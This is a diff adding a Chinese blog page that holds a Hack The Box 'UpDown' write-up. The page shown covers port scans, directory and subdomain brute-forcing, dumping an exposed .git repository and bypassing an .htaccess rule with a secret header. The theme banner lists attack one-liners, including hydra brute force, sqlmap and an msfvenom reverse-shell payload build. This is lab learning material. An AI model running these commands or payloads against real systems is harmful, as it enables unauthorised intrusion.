@@ -1,0 +1,1317 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Maxim Devere">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://maximdevere.github.io/2025/05/24/updown/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UpDown">
+<meta property="og:url" content="https://maximdevere.github.io/2025/05/24/UpDown/index.html">
+<meta property="og:site_name" content="DyuShine&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://maximdevere.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-05-24T04:45:01.748Z">
+<meta property="article:modified_time" content="2025-05-24T04:49:51.316Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Hackthebox">
+<meta property="article:tag" content="Linux Boxes">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://maximdevere.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/icon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.svg">
+    <meta name="theme-color" content="#0C344B">
+    <link rel="shortcut icon" href="/images/icon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            UpDown | DyuShine&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <link rel="stylesheet" href="/css/custom.css">
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"maximdevere.github.io","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["Security Researcher"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#0C344B","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/banner.light.svg","dark":"/images/banner.dark.svg"},"title":"Strategic Compromise","subtitle":{"text":["sqlmap -u http://target.com/page.php?id=1 --dbs","nmap -sS -sV -p- 192.168.1.0/24","hydra -l admin -P wordlist.txt 10.0.0.1 ssh","msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe","john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"rgba(0, 0, 0, 0.6)","dark":"rgba(209, 209, 182, 0.667);"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/MaximDevere","instagram":null,"zhihu":null,"twitter":null,"email":"maximdevere@gmali.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#3d7194","right":"#235777","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"tags":{"path":"/tags","icon":"fa-regular fa-tag"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Links":{"path":"/links","icon":"fa-regular fa-link"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":"Kali Linux | Burp Suite | Metasploit | Nmap | Wireshark | 0day | Red Team | CTF","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/5/12 18:31:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        DyuShine&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/logo.svg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                DyuShine&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tag fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tag fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">UpDown</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Maxim Devere</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Security Researcher</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-05-24 12:45:01</span>
+        <span class="mobile">2025-05-24 12:45:01</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-05-24 12:49:51</span>
+            <span class="mobile">2025-05-24 12:49:51</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/OSCP/">OSCP</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Hackthebox/">Hackthebox</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux-Boxes/">Linux Boxes</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="UpDown-HTB-渗透测试笔记"><a href="#UpDown-HTB-渗透测试笔记" class="headerlink" title="UpDown HTB 渗透测试笔记"></a>UpDown HTB 渗透测试笔记</h1><h2 id="整体渗透思路"><a href="#整体渗透思路" class="headerlink" title="整体渗透思路"></a>整体渗透思路</h2><ol>
+<li>端口扫描发现80和22端口，Web应用”Is my Website up ?”</li>
+<li>目录扫描发现&#x2F;dev目录，子域名枚举找到dev.siteisup.htb</li>
+<li>发现.git仓库暴露，使用git-dumper获取完整源代码</li>
+<li>源码审计发现多个漏洞：访问控制绕过、LFI、文件上传、SSRF</li>
+<li>绕过.htaccess访问控制（Special-Dev头部），利用文件上传+竞态条件获得RCE</li>
+<li>发现SUID程序&#x2F;home&#x2F;developer&#x2F;dev&#x2F;siteisup，利用Python代码注入提权至developer</li>
+<li>发现sudo权限easy_install，使用GTFOBins技术提权至root</li>
+</ol>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="快速端口发现"><a href="#快速端口发现" class="headerlink" title="快速端口发现"></a>快速端口发现</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sT --min-rate 10000 -p- 10.129.128.145</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>参数解析：</strong></p>
+<ul>
+<li><code>-sT</code>: TCP连接扫描，完整三次握手，更准确但较慢</li>
+<li><code>--min-rate 10000</code>: 最小发包速率10000包&#x2F;秒，加快扫描速度</li>
+<li><code>-p-</code>: 扫描全部65535个端口</li>
+</ul>
+<h3 id="详细服务识别"><a href="#详细服务识别" class="headerlink" title="详细服务识别"></a>详细服务识别</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.129.128.145</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>参数解析：</strong></p>
+<ul>
+<li><code>-sC</code>: 使用默认NSE脚本集合，等同于 <code>--script=default</code></li>
+<li><code>-sV</code>: 版本探测，识别服务版本信息</li>
+</ul>
+<p><strong>扫描结果：</strong></p>
+<ul>
+<li>22&#x2F;tcp: SSH OpenSSH 8.2p1 Ubuntu</li>
+<li>80&#x2F;tcp: HTTP Apache 2.4.41 (Ubuntu)</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="域名发现"><a href="#域名发现" class="headerlink" title="域名发现"></a>域名发现</h3><p>访问80端口发现网站标题”Is my Website up ?”，页面源码中发现域名<code>siteisup.htb</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.128.145 siteisup.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="目录暴力破解"><a href="#目录暴力破解" class="headerlink" title="目录暴力破解"></a>目录暴力破解</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,302,301 -u http://siteisup.htb/FUZZ</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>参数解析：</strong></p>
+<ul>
+<li><code>-w</code>: 指定字典文件</li>
+<li><code>-t 100</code>: 并发线程数100</li>
+<li><code>-mc 200,302,301</code>: 匹配HTTP状态码</li>
+<li><code>-u http://siteisup.htb/FUZZ</code>: 目标URL，FUZZ为占位符</li>
+</ul>
+<p><strong>发现：</strong> <code>/dev</code> 目录 (Status: 301重定向)</p>
+<h3 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110.txt -H <span class="string">&quot;Host: FUZZ.siteisup.htb&quot;</span> --hc 400 http://10.129.128.145/</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>参数解析：</strong></p>
+<ul>
+<li><code>-c</code>: 彩色输出</li>
+<li><code>-H &quot;Host: FUZZ.siteisup.htb&quot;</code>: 设置Host头进行虚拟主机枚举</li>
+<li><code>--hc 400</code>: 隐藏HTTP 400状态码响应</li>
+<li><strong>技术原理：</strong> 通过修改Host头部测试不同子域名，服务器根据Host头路由到不同虚拟主机</li>
+</ul>
+<p><strong>发现子域名：</strong> <code>dev.siteisup.htb</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.128.145 dev.siteisup.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Git仓库发现"><a href="#Git仓库发现" class="headerlink" title="Git仓库发现"></a>Git仓库发现</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://siteisup.htb/dev/ -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>参数解析：</strong></p>
+<ul>
+<li><code>dir</code>: 目录暴力破解模式</li>
+<li><code>-u</code>: 目标URL</li>
+<li><code>-w</code>: 字典文件</li>
+</ul>
+<p><strong>关键发现：</strong> <code>/.git/HEAD</code> (Status: 200) - Git仓库暴露</p>
+<h2 id="Git仓库利用"><a href="#Git仓库利用" class="headerlink" title="Git仓库利用"></a>Git仓库利用</h2><h3 id="Git仓库转储"><a href="#Git仓库转储" class="headerlink" title="Git仓库转储"></a>Git仓库转储</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/kali/Downloads/git-dumper</span><br><span class="line">python3 -m venv venv</span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line">pip install dulwich beautifulsoup4</span><br><span class="line">python3 git_dumper.py http://siteisup.htb/dev/.git/ ./siteisup-source</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>工具原理：</strong></p>
+<ul>
+<li>git-dumper通过访问.git目录的各种文件重建完整仓库</li>
+<li>利用Git的内部文件结构（objects、refs、index等）恢复源代码</li>
+<li>比直接访问.git&#x2F;config更全面，可获取完整提交历史</li>
+</ul>
+<h3 id="源码文件结构"><a href="#源码文件结构" class="headerlink" title="源码文件结构"></a>源码文件结构</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">siteisup-source/</span><br><span class="line">├── admin.php (59 bytes)</span><br><span class="line">├── changelog.txt (147 bytes)  </span><br><span class="line">├── checker.php (3145 bytes) - 主要功能文件</span><br><span class="line">├── .htaccess (117 bytes) - Apache访问控制</span><br><span class="line">├── index.php (273 bytes) - 路由控制器</span><br><span class="line">└── stylesheet.css (5531 bytes)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h2><h3 id="htaccess访问控制分析"><a href="#htaccess访问控制分析" class="headerlink" title=".htaccess访问控制分析"></a>.htaccess访问控制分析</h3><div class="code-container" data-rel="Apache"><figure class="iseeu highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetEnvIfNoCase</span> Special-Dev <span class="string">&quot;only4dev&quot;</span> Required-Header</span><br><span class="line"><span class="attribute">Order</span> <span class="literal">Deny</span>,<span class="literal">Allow</span></span><br><span class="line"><span class="attribute">Deny</span> from <span class="literal">All</span></span><br><span class="line"><span class="attribute">Allow</span> from env=Required-Header</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>机制解析：</strong></p>
+<ul>
+<li><code>SetEnvIfNoCase</code>: 不区分大小写设置环境变量</li>
+<li>当HTTP头<code>Special-Dev</code>值为<code>only4dev</code>时，设置环境变量<code>Required-Header</code></li>
+<li><code>Order Deny,Allow</code>: 先拒绝所有，再根据Allow规则允许</li>
+<li><code>Allow from env=Required-Header</code>: 只允许有该环境变量的请求</li>
+</ul>
+<p><strong>绕过方法：</strong> 添加HTTP头部 <code>Special-Dev: only4dev</code></p>
